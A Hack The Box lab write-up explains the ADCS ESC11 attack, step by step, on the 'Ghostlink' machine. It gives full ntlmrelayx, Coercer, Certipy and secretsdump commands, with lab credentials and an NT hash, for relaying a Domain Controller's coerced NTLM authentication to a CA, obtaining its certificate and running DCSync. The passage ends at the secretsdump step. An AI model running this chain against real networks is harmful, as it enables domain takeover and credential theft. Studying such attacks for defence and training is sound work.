excerpt: Exploitation of ADCS ESC11 through unencrypted RPC ICertPassage interfaces
  via NTLM relaying to compromise Active Directory environments.
---




## Introduction

**ESC11** is a vulnerability in **Active Directory Certificate Services (ADCS)** that occurs when the RPC interface of the Certificate Authority (CA) — specifically the **ICertPassage (MS-ICPR)** interface — does not enforce signing or encryption for certificate enrollment requests. This happens because the `IF_ENFORCEENCRYPTICERTREQUEST` flag is disabled on the CA.

Since no packet signing or encryption is required on this RPC interface, it becomes vulnerable to **NTLM Relay** attacks. If an attacker manages to coerce the NTLM authentication of a privileged account (such as the machine account of a Domain Controller or a Domain Admin), they can relay that authentication to the CA's RPC port and request a valid certificate on behalf of the victim.

### Why is this critical?

> **Why do we coerce the DC and not another machine?**
>
> We need a certificate using the **DomainController** template. This template allows unconstrained delegation and provides us with a certificate we can use to authenticate as the Domain Controller itself (`DC01$`).
>
> The `DC01$` account has **Enroll** permissions on the CA (like any *Authenticated User*), and the `DomainController` template is available in the environment.

If we obtain a certificate for `DC01$`, we can execute the following attack chain:

`DC01$ Certificate ──> PKINIT (Request TGT) ──> Extract NT Hash ──> DCSync (NTDS.dit) ──> Admin Hash`

1. **Request a TGT:** We obtain the ticket for `DC01$` using the newly issued certificate.
2. **Extract the NT hash:** We retrieve the machine account hash during the TGT request via PKINIT.
3. **Execute DCSync:** We use the DC hash against `NTDS.dit` to dump all domain secrets.
4. **Full compromise:** We steal the `Administrator` user hash to gain complete control of the environment.

## Scenario

The scenario in which I worked this vulnerability was on the **Ghostlink** machine from Hack The Box, which presents the following infrastructure:

![Lab infrastructure diagram](/assets/images/posts/ESC11_Ghostlink/arch.png)

To elaborate further:

```
10.10.15.174   Kali-Linux             → Attacker machine
172.16.20.20   gpz-op26-toolkits      → Compromised machine used as a pivot to reach the CA
172.16.20.10   gpz-op26-secure        → CA (Certificate Authority) ghostlink-GPZ-OP26-SECURE-CA
10.129.41.180  DC01.ghostlink.local   → Domain Controller
```

## Phase 1: ADCS Enumeration

First, we need to confirm whether ADCS exists in the domain and whether any CA has the ESC11 vulnerability.

With **NetExec** we identify that a CA exists in the domain:

```bash
➜  Ghostlink nxc ldap dc01.ghostlink.htb -u 'nvirelli' -p u47YUclrDiwWxBheaSzI -M adcs

LDAP   10.129.42.12    389   DC01        [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:ghostlink.htb) (signing:Enforced) (channel binding:When Supported)
LDAP    10.129.42.12   389   DC01        [+] ghostlink.htb\nvirelli:u47YUclrDiwWxBheaSzI
ADCS    10.129.42.12   389   DC01        [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS    10.129.42.12   389   DC01        Found PKI Enrollment Server: gpz-op26-secure.ghostlink.htb
ADCS    10.129.42.12   389   DC01        Found CN: ghostlink-GPZ-OP26-SECURE-CA
```

The CA is confirmed and found on the gpz-op26-secure machine.

We now check CA vulnerabilities with **Certipy**:

```bash
➜  Ghostlink certipy find -u 'nvirelli@ghostlink.htb' -p 'u47YUclrDiwWxBheaSzI' -dc-host dc01.ghostlink.htb -ns 10.129.41.180 -dns-tcp -vulnerable -stdout

```

**Enforce Encryption for Requests     : Disabled**

This means we can intercept the NTLM authentication of any privileged machine and relay it as-is to the CA to obtain a certificate.

## Phase 2: Environment Setup

To better understand the attack flow, it is necessary to detail the environment structure. As mentioned above, the CA (`gpz-op26-secure.ghostlink.htb`) is on a different network segment (`172.16.20.0/24`) and our Kali Linux attacker machine is on the `10.10.15.0/24` network. To resolve this lack of direct connectivity, we use **Ligolo-ng** to establish a tunnel and pivot through the `gpz-op26-toolkits` machine (172.16.20.20), which has visibility into both networks.

![Ligolo-ng tunnel setup](/assets/images/posts/ESC11_Ghostlink/ligolo.png)

With this configuration in place, we now have direct addressing and access to the CA.

## Phase 3: Attack Execution

This is where it gets interesting — the attack itself.

### Step 1: Set Up the Relay

ntlmrelayx will listen to intercept the DC's authentication and relay it to the CA.
Open a terminal and run:

```sh
➜  Ghostlink sudo ~/venv/esc11/bin/ntlmrelayx.py -t rpc://172.16.20.10 -rpc-mode ICPR -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' -smb2support --template DomainController
```

| Parameter | What it does |
| :--- | :--- |
| `-t rpc://172.16.20.10` | Relay target: the CA via RPC protocol |
| `-rpc-mode ICPR` | Uses the `ICertPassage` interface (the one that processes certificates) |
| `-icpr-ca-name '...'` | Name of the CA to request the certificate from |
| `--template DomainController` | Certificate template we are going to request |

At this point, the relay is waiting for incoming connections.

### Step 2: DC Coercion with Coercer

To force the Domain Controller to authenticate toward our Kali machine (where the relay is waiting), we run **Coercer**:

```bash
coercer coerce \
  -l 10.10.15.174 \
  -t dc01.ghostlink.htb \
  -d ghostlink.htb \
  -u nvirelli \
  -p 'u47YUclrDiwWxBheaSzI' \
  --dc-ip 10.129.41.180
```

| Parameter | What it does |
| :--- | :--- |
| `coerce` | Attack mode: forces the target to authenticate against us |
| `-l 10.10.15.174` | Listener IP (our Kali). The DC will connect to this IP |
| `-t dc01.ghostlink.htb` | Target (the machine we want to coerce). Can be IP or hostname |
| `-d ghostlink.htb` | Domain the user belongs to |
| `-u nvirelli` | User we authenticate with to the DC to send the RPC calls |
| `-p 'u47YUclrDiwWxBheaSzI'` | User password |
| `--dc-ip 10.129.41.180` | DC IP (required because the hostname resolves to the same IP and Coercer needs to know where the DC is) |

> **What does this mean?**
> We use `nvirelli`'s credentials to invoke RPC methods on the DC and force it to initiate an outbound connection to our IP (`10.10.15.174`).

When Coercer prompts to continue through the various methods and protocols, enter `C` (*Continue*):

```text
Continue (C) | Skip this function (S) | Stop exploitation (X) ?
```

Press `C` to continue (Coercer will try various methods/protocols until it forces the connection to our listener IP).

## Relay Flow

When we run both commands in parallel, the network-level attack flow follows this order:

![Full relay flow diagram](/assets/images/posts/ESC11_Ghostlink/flujo.png)


## Phase 4: Obtaining the Certificate

As seen in the ntlmrelayx output, the certificate was successfully obtained using the `DomainController` template:

```sh
[*] (RPC): Received connection from 10.129.41.180, attacking target rpc://172.16.20.10
[*] (RPC): Authenticating connection from GHOSTLINK/DC01$@10.129.41.180 against rpc://172.16.20.10 SUCCEED
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Generating CSR...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> CSR generated!
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Getting certificate...
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Successfully requested certificate
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Request ID is 5
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Writing PKCS#12 certificate to ./DC01.pfx
[*] rpc://GHOSTLINK/DC01$@172.16.20.10 -> Certificate successfully written to file
```

We now have `DC01.pfx` on disk.

## Phase 5: From Certificate to Domain Admin

With the certificate (`DC01.pfx`) in hand, the next step is to obtain a TGT for the machine account and then perform a DCSync. However, when attempting to authenticate it is common to encounter the following error:

The **`KRB_AP_ERR_SKEW (clock skew too great)`** error (code `0x1e`) indicates that the time difference between our attacker machine and the KDC (Domain Controller) exceeds the allowed limit (5 minutes by default).

To fix it, we synchronize our attack machine's clock using `ntpdate`:

```sh
sudo ntpdate 10.129.41.180
```

There are several ways to resolve this time synchronization error. If you want to know more alternatives, I recommend checking out [this article](https://hackpuntes.com/es/posts/fixing-krb-ap-err-skew-kerberos-clock-skew/).

With the clock synchronized, we run **Certipy** using the obtained certificate to request a TGT and retrieve the NT hash:

```sh
➜  Ghostlink certipy auth -pfx DC01.pfx -dc-ip 10.129.41.180 -dns-tcp -ns 10.129.41.180 -domain ghostlink.htb

```

> ### What happened under the hood?
>
> When presenting the certificate to the **KDC (Key Distribution Center)** via **PKINIT** (the Kerberos extension that enables certificate-based authentication):
>
> 1. **Identity Validation:** The KDC reads the **SAN (Subject Alternative Name)** field of the certificate, which points to `dc01.ghostlink.htb`.
> 2. **TGT Issuance:** Upon verifying that the certificate is legitimate and trusted, the KDC generates and delivers a **TGT (Ticket Granting Ticket)** for the machine account `DC01$`.
> 3. **NT Hash Recovery:** During this PKINIT exchange (specifically in the *AS-REP* response), **Certipy** decrypts the data structure and extracts the **NT hash** of the domain controller account.

With the DC hash, we can execute DCSync. The `DC01$` account holds directory replication permissions (GetChanges, GetChangesAll), so it can request a copy of the NTDS.dit:

```sh
➜  Ghostlink secretsdump.py ghostlink.htb/dc01\$@dc01.ghostlink.htb -dc-ip 10.129.41.180 -hashes :82c9731fecb932a3f457f81768641f68 -just-dc-user administrator
